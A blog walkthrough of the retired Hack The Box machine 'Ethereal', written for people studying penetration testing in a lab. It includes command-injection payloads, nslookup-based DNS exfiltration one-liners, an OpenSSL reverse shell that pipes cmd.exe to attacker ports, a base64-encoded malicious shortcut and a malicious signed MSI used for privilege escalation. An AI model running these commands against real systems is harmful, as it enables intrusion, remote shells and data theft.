---
layout: post
title: "Ethereal: Hack The Box Walkthrough"
date: 2019-03-09 15:25:19 +0000
last_modified_at: 2019-03-09 15:25:30 +0000
category: Walkthrough
tags: ["Hack The Box", Ethereal, retired]
comments: true
image:
  feature: ethereal-htb-walkthrough.jpg
  credit: Hans / Pixabay
  creditlink: https://pixabay.com/en/northern-lights-aurora-3273425/
---

This post documents the complete walkthrough of Ethereal, a retired vulnerable [VM][1] created by [egre55][2] and [MinatoTW][3], and hosted at [Hack The Box][4]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## Background

Ethereal is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.106

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-02-18 02:01:47 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 80/tcp on 10.10.10.106
Discovered open port 8080/tcp on 10.10.10.106
Discovered open port 21/tcp on 10.10.10.106
```

`masscan` finds three open ports. Let's do one better with `nmap` scanning the discovered ports.

```
# nmap -n -v -Pn -p21,80,8080 -A --reason -oN nmap.txt 10.10.10.106
...
PORT     STATE SERVICE REASON          VERSION
21/tcp   open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV IP 172.16.249.135 is not the same as 10.10.10.106
| ftp-syst:
|_  SYST: Windows_NT
80/tcp   open  http    syn-ack ttl 127 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ethereal
8080/tcp open  http    syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Bad Request
```

Since FTP allows anonymous login, let's start with that first. Long story short, the only usable piece of information lies in `FDISK.zip`.

<a class="image-popup">
![3cae9980.png](/assets/images/posts/ethereal-htb-walkthrough/3cae9980.png)
</a>

The file contains a FAT filesystem that we can mount like so.

<a class="image-popup">
![a3c74dd3.png](/assets/images/posts/ethereal-htb-walkthrough/a3c74dd3.png)
</a>

## PasswordBox

The directory `pbox` contains a MS-DOS executable `PBOX.EXE`, i.e. PasswordBox [program](https://sourceforge.net/projects/passwbox/).

We can use DOSBox to open it. We'll mount directory `pbox` as `C:` volume.

<a class="image-popup">
![8284f9c3.png](/assets/images/posts/ethereal-htb-walkthrough/8284f9c3.png)
</a>

When you try to run `PBOX.EXE`, DOSBox will complain that there's no DPMI (DOS Protected Mode Interface). We can enable DPMI through [CWSDPMI](http://sandmann.dotster.com/cwsdpmi/), a DPMI host that allows DOS programs to run in protected mode.

Simply place `CWSDPMI.exe` in the same location as `PBOX.EXE` and we are good to go.

<a class="image-popup">
![c05c4d7e.png](/assets/images/posts/ethereal-htb-walkthrough/c05c4d7e.png)
</a>

The master password is `password`, which I got it on my first attempt. :laughing:

<a class="image-popup">
![000c545f.png](/assets/images/posts/ethereal-htb-walkthrough/000c545f.png)
</a>

To make things easier for copying, you can also run `PBOX.EXE` with the `--dump` switch. This switch will dump all the credentials onto standard output.

<a class="image-popup">
![3bb1590a.png](/assets/images/posts/ethereal-htb-walkthrough/3bb1590a.png)
</a>

## Internet Information Services (IIS)

Now, let's turn our attention to the `http` services, `80/tcp` and `8080/tcp`. This is how `80/tcp` looks like.

<a class="image-popup">
![901acc57.png](/assets/images/posts/ethereal-htb-walkthrough/901acc57.png)
</a>

Very nice! Anyways, the key to the next clue lies here.

<a class="image-popup">
![96a032ef.png](/assets/images/posts/ethereal-htb-walkthrough/96a032ef.png)
</a>

See where it links to?

<a class="image-popup">
![5b2507a1.png](/assets/images/posts/ethereal-htb-walkthrough/5b2507a1.png)
</a>

It'll be wise to add `ethereal.htb` to `/etc/hosts` because this is what you get if you have not done so.

<a class="image-popup">
![74353936.png](/assets/images/posts/ethereal-htb-walkthrough/74353936.png)
</a>

And this is what you get otherwise. :smirk:

<a class="image-popup">
![08720c5f.png](/assets/images/posts/ethereal-htb-walkthrough/08720c5f.png)
</a>

Recall the credentials we collected earlier? Turns out that (`alan:!C414m17y57r1k3s4g41n!`) is the right combination to login for the Basic Authentication scheme.

<a class="image-popup">
![4c9e5bee.png](/assets/images/posts/ethereal-htb-walkthrough/4c9e5bee.png)
</a>

## Test Connection

This is how it looks like after logging in.

<a class="image-popup">
![a36d7d47.png](/assets/images/posts/ethereal-htb-walkthrough/a36d7d47.png)
</a>

This form allows one to send exactly two ICMP echo request messages to an external IP address. Here's me using the form to send the request to my own IP address.

<a class="image-popup">
![e64a8d77.png](/assets/images/posts/ethereal-htb-walkthrough/e64a8d77.png)
</a>

I had a `tcpdump` session to capture ICMP traffic.

<a class="image-popup">
![3f0f95b5.png](/assets/images/posts/ethereal-htb-walkthrough/3f0f95b5.png)
</a>

The form must have been implemented with the following Windows command:

`ping -n2 <ip_address>`

As such, I'm able to execute remote command by prepending a single ampersand character (`&`). This allows the form to execute my command regardless of whether the `ping` was successfully executed or not.

Now, let's see if the box allows DNS queries. I'm using `dnschef` to set up a fake DNS server that only has one answer to all the queries.

```
# dnschef --fakeip=10.10.10.106 -i 10.10.13.92 --logfile=exfil
```

Meanwhile, I have another terminal windows to display just the query.

```
# tail -f exfil | grep --line-buffered cooking | cut -d' ' -f11
```

This is the test.

<a class="image-popup">
![71356cb8.png](/assets/images/posts/ethereal-htb-walkthrough/71356cb8.png)
</a>

If the test is successful, I should see `this.is.a.test` on the log.

<a class="image-popup">
![976f157f.png](/assets/images/posts/ethereal-htb-walkthrough/976f157f.png)
</a>

Awesome. I can exfiltrate data through DNS!

&hellip;

Building on the above insights, these are some of the commands I came up with to exfiltrate enumeration results from the box.

_Show current hostname and user_

```
& for /f "usebackq tokens=1,2 delims=\" %i in (`whoami`) do nslookup %i_%j 10.10.13.92
```

_List world-writable directory in %PUBLIC%_

```
& for /f "usebackq tokens=1-10* delims=\" %i in (`dir /a-rd /s /b %PUBLIC%`) do nslookup %i_%j_%k_%l_%m 10.10.13.92
```

_List files in a directory—C:\Program Files (x86)\\_

```
& for /f "usebackq tokens=*" %i in (`dir /b c:\progra~2`) do nslookup %i 10.10.13.92
```

_Redirect command output to a file in a world-writable directory_

```
& netsh advfirewall firewall show rule name=all dir=out verbose > c:\users\public\desktop\shortcuts\fw.txt
```

_Check if file/directory exists_

```
& if exist c:\users\public\desktop\shortcuts (nslookup yes 10.10.13.92) else (nolookup no 10.10.13.92)
```

_Display outbound firewall rules_

```
& for /f "eol=- skip=100 tokens=1-10*" %i in (c:\users\public\desktop\shortcuts\fw.txt) do nslookup %i_%j_%k_%l_%m_%o_%p_%q 10.10.13.92
```
_Check access control list of files/directories_

```
& for /f "tokens=1-10*" %i in ('icacls c:\users\public\desktop\shortcuts') do nslookup %i_%j_%k_%l_%m_%o_%p_%q 10.10.13.92
```

## Data Exfiltration

Running the command to ***display outbound firewall rules*** reveals the following:

```
Rule Name: Allow ICMP Request   
Enabled: Yes      
Direction: Out      
Profiles: Domain,Private,Public      
Grouping:       
LocalIP: Any      
RemoteIP: Any      
Protocol: ICMPv4      
Type Code      
8 Any      
Edge traversal: No     
InterfaceTypes: Any      
Security: NotRequired      
Rule source: Local Setting    
Action: Allow      

Rule Name: Allow UDP Port
Enabled: Yes
Direction: Out
Profiles: Domain,Private,Public
Grouping:
LocalIP: Any
RemoteIP: Any
Protocol: UDP
LocalPort: Any
RemotePort: 53
Edge traversal: No
InterfaceTypes: Any
Security: NotRequired
Rule source: Local Setting
Action: Allow

Rule Name: Allow TCP Ports 136
Enabled: Yes
Direction: Out
Profiles: Domain,Private,Public
Grouping:
LocalIP: Any
RemoteIP: Any
Protocol: TCP
LocalPort: Any
RemotePort: 73,136      
Edge traversal: No     
InterfaceTypes: Any      
Security: NotRequired      
Rule source: Local Setting    
Action: Allow      

Rule Name: Allow ICMP Reply   
Enabled: Yes      
Direction: Out      
Profiles: Domain,Private,Public      
Grouping:       
LocalIP: Any      
RemoteIP: Any      
Protocol: ICMPv4      
Type Code      
0 Any      
Edge traversal: No     
InterfaceTypes: Any      
Security: NotRequired      
Rule source: Local Setting    
Action: Allow
```

Running the command to ***list files in a directory—C:\Program Files (x86)*** revealed the pressence of OpenSSL.

```
Microsoft.NET
MSBuild
OpenSSL-v1.1.0
WindowsPowerShell
```

Going deeper into the OpenSSL directory reveals the `openssl.exe` binary.

<a class="image-popup">
![d87da0ed.png](/assets/images/posts/ethereal-htb-walkthrough/d87da0ed.png)
</a>

## Remote Command Execution

We have two TCP ports allowed for outbound communications and there's OpenSSL available. Perhaps we can create an encrypted tunnel for shuttling data back and forth between the box and my attacking machine?

Let's give it a shot using the following command on the form.

```
& c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.13.92:73 | cmd.exe /k /q | c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.13.92:136
```

We need to set up two SSL servers listening at `73/tcp` and `136/tcp` on my attacking machine, one for `echo`ing commands to `cmd.exe`, the other for displaying output from `cmd.exe`, respectively. I'm sure you get the idea. :wink:

But first, we need a self-signed certificate for the SSL server. Here's the command to generate a self-signed certificate using `openssl`.

```
# openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem
```

Now, launch the two SSL servers like so.

```
# openssl s_server -quiet -key key.pem -cert cert.pem -port 73 < cmd
# openssl s_server -quiet -key key.pem -cert cert.pem -port 136
```

Send the commands in `cmd` to the SSL server at `73/tcp`. The moment the form connects to it, the commands is echoed to `cmd.exe` and the output from `cmd.exe` is piped to `136/tcp`.

Here are the commands in `cmd` I want to run at the box.

```
cd
whoami
```

Here comes the moment of truth...

<a class="image-popup">
![516883df.png](/assets/images/posts/ethereal-htb-walkthrough/516883df.png)
</a>

And, we have remote command execution! Although we have remote command execution, it feels like submitting instructions in a punched card. Nostalgic but painful.

During enumeration of `alan`'s account, I notice a note on his desktop.

```
I've created a shortcut for VS on the Public Desktop to ensure we use the same version. Please delete any existing shortcuts and use this one instead.

- Alan
```

If I had to guess, I would say that I need to create a malicious shortcut (LNK) file and replace the VS shortcut with it. And a scheduled task would be running the shortcut as another user. To create the shortcut, I can use [LNKUp](https://github.com/Plazmaz/LNKUp) to generate a Windows shortcut that will execute a command when run.


```
# python generate.py --host localhost --out evil.lnk --execute 'c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.13.92:73 | cmd.exe /k /q | c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.13.92:136' --type ntlm
\
  ~==================================================~
##                                                    ##
##  /$$       /$$   /$$ /$$   /$$ /$$   /$$           ##
## | $$      | $$$ | $$| $$  /$$/| $$  | $$           ##
## | $$      | $$$$| $$| $$ /$$/ | $$  | $$  /$$$$$$  ##
## | $$      | $$ $$ $$| $$$$$/  | $$  | $$ /$$__  $$ ##
## | $$      | $$  $$$$| $$  $$  | $$  | $$| $$  \ $$ ##
## | $$      | $$\  $$$| $$\  $$ | $$  | $$| $$  | $$ ##
## | $$$$$$$$| $$ \  $$| $$ \  $$|  $$$$$$/| $$$$$$$/ ##
## |________/|__/  \__/|__/  \__/ \______/ | $$____/  ##
##                                         | $$       ##
##                                         | $$       ##
##                                         |__/       ##
  ~==================================================~

File saved to /root/Downloads/repo/LNKUp/evil.lnk
Link created at evil.lnk with UNC path \\localhost\Share\44170.ico.

# base64 -w0 evil.lnk
TAAAAAEUAgAAAAAAwAAAAAAAAEZhAAAAAAAAAABnnmOvytQBAGeeY6/K1AEAZ55jr8rUAQAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAOcAFAAfUOBP0CDqOmkQotgIACswMJ0ZAC9DOlwAAAAAAAAAAAAAAAAAAAAAAAAAPAAxAAAAAABWTs5oEABXaW5kb3dzACYAAwAEAO++Vk7OaFZOzmgUAAAAVwBpAG4AZABvAHcAcwAAABYAQAAxAAAAAABWTs5oEABTeXN0ZW0zMgAAKAADAAQA775WTs5oVk7OaBQAAABTAHkAcwB0AGUAbQAzADIAAAAYADwAMgAAKgQAVk7OaBAAY21kLmV4ZQAmAAMABADvvlZOzmhWTs5oFAAAAGMAbQBkAC4AZQB4AGUAAAAWAAAAuwAvYyBjOlxwcm9ncmF+MlxvcGVuc3NsLXYxLjEuMFxiaW5cb3BlbnNzbC5leGUgc19jbGllbnQgLXF1aWV0IC1jb25uZWN0IDEwLjEwLjEzLjkyOjczIHwgY21kLmV4ZSAvayAvcSB8IGM6XHByb2dyYX4yXG9wZW5zc2wtdjEuMS4wXGJpblxvcGVuc3NsLmV4ZSBzX2NsaWVudCAtcXVpZXQgLWNvbm5lY3QgMTAuMTAuMTMuOTI6MTM2GwBcXGxvY2FsaG9zdFxTaGFyZVw0NDE3MC5pY28AAAAA
```

Now, how do I transfer the LNK file over to the box? I can `echo` the `base64`-encoded string of the LNK file and redirect/write it to `C:\Users\Public\Desktop\Shortcuts` on the form like so.

```
& echo TAAAAAEU...Y28AAAAA > c:\users\public\desktop\shortcuts\evil.lnk.b64
```

<a class="image-popup">
![10fbd4c2.png](/assets/images/posts/ethereal-htb-walkthrough/10fbd4c2.png)
</a>

The next task would be to base64-decode it back to the LNK file. How do I do that? `openssl`! My `cmd` now looks like this.

```
cd c:\users\public\desktop\shortcuts
c:\progra~2\openssl-v1.1.0\bin\openssl.exe base64 -A -d -in evil.lnk.b64 -out "Visual Studio 2017.lnk"
type "Visual Studio 2017.lnk"
```

A while later, this appears...

<a class="image-popup">
![05fa9fc0.png](/assets/images/posts/ethereal-htb-walkthrough/05fa9fc0.png)
</a>

Naughty `jorge` is the one *double-clicking* the shortcut! I see...I need to repeat the steps of echoing commands to the SSL server listening at `73/tcp`, with one exception. I can't control when the commands get executed because we'll have to wait for `jorge` to *double-click* the shortcut.

During enumeration of `jorge`'s account, I found `user.txt` at the desktop.

<a class="image-popup">
![249560b1.png](/assets/images/posts/ethereal-htb-walkthrough/249560b1.png)
</a>

I also found out that there are two mounted volumes in the box.

<a class="image-popup">
![3ff07810.png](/assets/images/posts/ethereal-htb-walkthrough/3ff07810.png)
</a>

Further enumeration of D: drive reveals another note at `D:\DEV\MSIs\note.txt`.

```
Please drop MSIs that need testing into this folder - I will review regularly. Certs have been added to the store already.

- Rupal
```

What now? Create malicious signed MSI? Challenge accepted. :triumph:

## Privilege Escalation

I'm using WiX Toolset to create the malicious MSI, and `signtool` from Windows SDK to sign it. Having said that, the instructions to install and configure them is beyond the scope of this walkthrough. I'll leave you with an exercise to extract the CA certificate and private key from `D:\Certs`. **Hint**: use `openssl base64`.

The WiX Toolset allows one to create MSI file using WiX file, an XML document describing the MSI file. Here's the WIX file I'm using.

```xml
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
	<Product Id="*" UpgradeCode="ABCDDCBA-7349-453F-94F6-BCB5110BA4FD" Name="Foobar 1.0" Version="0.0.1" Manufacturer="Acme Ltd." Language="1033">
	<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
	<Media Id="1" Cabinet="foobar.cab" EmbedCab="yes"/>
	<Directory Id="TARGETDIR" Name="SourceDir">
		<Directory Id="ProgramFilesFolder">
			<Directory Id="INSTALLLOCATION" Name="foobar">
				<Component Id="foobar" Guid="ABCDDCBA-83F1-4F22-985B-FDB3C8ABD471">
					<File Id="foobar" Source="foobar.exe"/>
				</Component>
			</Directory>
		</Directory>
	</Directory>
	<Feature Id="DefaultFeature" Level="1">
		<ComponentRef Id="foobar"/>
	</Feature>
	<CustomAction Id="Root" Directory="TARGETDIR" ExeCommand="cmd.exe /c type c:\users\rupal\desktop\root.txt > c:\users\public\desktop\shortcuts\success.txt" Execute="deferred" Impersonate="yes" Return="ignore"/>
	<InstallExecuteSequence>
		<Custom Action="Root" After="InstallInitialize"></Custom>
	</InstallExecuteSequence>
	</Product>
</Wix>
```

Upon running the MSI file as administrator, we'll redirect `root.txt` to `success.txt`, and place it a location where everyone has access. :smirk:

But before we compile the WiX file to MSI, we need to issue a software publisher certificate (SPC), i.e. the code signing certificate.

Run the following commands to generate the SPC.

<a class="image-popup">
![spc](/assets/images/posts/ethereal-htb-walkthrough/spc.png)
</a>

`makecert.exe` will prompt you for a password to protect the generated private key. You'll see something like this. Use any password you like.

<a class="image-popup">
![makecert](/assets/images/posts/ethereal-htb-walkthrough/makecert.png)
</a>

We can now proceed to create the MSI file with a candlelight dinner, first with `candle.exe`.

<a class="image-popup">
![candle](/assets/images/posts/ethereal-htb-walkthrough/candle.png)
</a>

And then `light.exe`.

<a class="image-popup">
![light](/assets/images/posts/ethereal-htb-walkthrough/light.png)
</a>

Finally, we sign the MSI file with our newly minted SPC.

<a class="image-popup">
![signtool](/assets/images/posts/ethereal-htb-walkthrough/signtool.png)
</a>

Let's copy `evil.msi` to the box. On our attacking machine, run the following command.

```
# openssl s_server -quiet -key key.pem -cert cert.pem -port 73 < evil.msi
```

On the form, run the following command.

```
& c:\progra~2\openssl-v1.1.0\bin\openssl.exe s_client -quiet -connect 10.10.13.92:73 > c:\users\public\desktop\shortcuts\evil.msi
```

**Note**: You may need to do this a couple of times. I encountered truncation of the file. It was painful...

Now, I have `jorge` execute the following commands.

```
cd c:\users\public\desktop\shortcuts
copy /y evil.msi d:\DEV\MSIs
d:
cd d:\DEV\MSIs
dir
```

Upon dropping the MSI file at `D:\DEV\MSIs`, I got `root.txt` moments later, courtesy of Rupal.

<a class="image-popup">
![38fc552f.png](/assets/images/posts/ethereal-htb-walkthrough/38fc552f.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/157
[2]: https://www.hackthebox.eu/home/users/profile/1190
[3]: https://www.hackthebox.eu/home/users/profile/8308
[4]: https://www.hackthebox.eu/
